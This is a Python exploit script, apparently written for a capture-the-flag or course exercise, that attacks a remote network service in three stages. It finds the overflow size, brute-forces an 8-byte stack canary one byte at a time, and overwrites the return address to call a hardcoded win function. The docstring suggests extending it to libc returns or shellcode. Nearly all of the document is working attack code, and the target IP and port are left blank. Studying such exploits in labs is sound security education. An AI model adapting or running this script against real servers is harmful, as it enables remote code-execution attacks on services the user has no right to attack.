#!/usr/bin/env python3

import struct
import socket
import time


"""
This program is a three-stage exploit designed to bypass a stack canary protection and 
execute a function at a known memory address (`win`) on a remote server.

### Exploit Stages:

1. **Buffer Overflow Detection (`CODE1`)**:
   - Determines the input size required to reach the stack canary by sending increasingly 
     larger payloads of 'A' characters.
   - Identifies the threshold at which the response from the server differs, revealing 
     the exact size of the buffer before the canary is encountered.

2. **Stack Canary Extraction (`CODE2`)**:
   - Iteratively brute-forces the 8-byte stack canary by sending test payloads.
   - If the response length matches the expected normal response size, the tested byte 
     is part of the canary.
   - Builds the full canary byte by byte using this method.

3. **Return Address Overwrite (`CODE3`)**:
   - Constructs a final exploit payload that includes:
     - The correctly sized input buffer.
     - The extracted stack canary to bypass stack protection.
     - Padding to align the stack.
     - The memory address of the `win` function to redirect execution.
   - Sends this crafted payload to the server, triggering execution of `win` and 
     retrieving the flag.

### Notes:
- This exploit leverages stack-based buffer overflows while circumventing canary-based 
  protection.
- The `win` function's address must be known in advance.
- The payload is dynamically adjusted based on live responses from the target server.
- The attack follows a structured approach: overflow discovery, canary leakage, and 
  control hijacking.

**Opportunity for modifications**
- Adjust the return address to libc once location is known.
- Shell code in the event the stack is executable.
"""


'''CODE1'''

IP = '' # SERVER IP
PORT =  # SERVER PORT

TRGT = (IP,PORT)



# loop for input size range as indicated in instrucitons
for i in range (32,129):

    payload = b'A' * i
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(TRGT)

    # Receive initial prompt and send NUID
    msg1 = s.recv(1024)
    print(msg1)
    s.send(b'12456789')

    # Receive Second prompt and send buffer payload
    msg2 = s.recv(1024)
    print(msg2)

    # Send the buffer payload
    s.send(payload)
    msg3 = s.recv(1024)

    print((msg3), len(payload))


    if len(msg3) != 29:
        input_size = len(payload) - 1
        print("The input size is:", input_size)
        break

    s.close() # close connection
    time.sleep(0.2) # this is not to overload the server


'''CODE2'''

canary = b''

# 8 byte canary
for i in range(8):

    #256 possible bytes
    for byte in range(256):

        # Create payload of padding, partial canary and potential bytes 
        incomplete_canary = canary + bytes([byte])
        payload = b'A' * input_size + incomplete_canary

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(TRGT)
        
        # Receive initial prompt and send NUID
        msg1 = s.recv(1024)
        print(msg1)
        s.send(b'12456789')

        # Receive Second prompt and send buffer payload
        msg2 = s.recv(1024)
        print(msg2)

        # Send the buffer payload
        s.send(payload)
        msg3 = s.recv(1024)

        # Normal (len) response means byte is part of canary. 
        # Add byte to canary and loop again
        if len(msg3) == 29:  
            canary += byte.to_bytes(1, 'little')
            print(f"Current leaked canary: {canary.hex()}")
            s.close()
            break  

        s.close()

print(f"Canary found = 0x{canary.hex()}")



'''CODE3'''


# address of win
win_addr = 0x40152f  

# Padding after canary
padding_length = 8

# payload includes Input size, canary, padding, and addr to win
final_payload = (
    b'A' * input_size +   
    canary +              
    b'B' * padding_length +  
    struct.pack("<Q", win_addr)  
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(TRGT)

s.recv(1024)
s.send(b'12456789')

s.recv(1024)
s.send(final_payload)

# print flag
flag_output = s.recv(1024)
print(f"Flag= {flag_output.decode()}")

s.close()

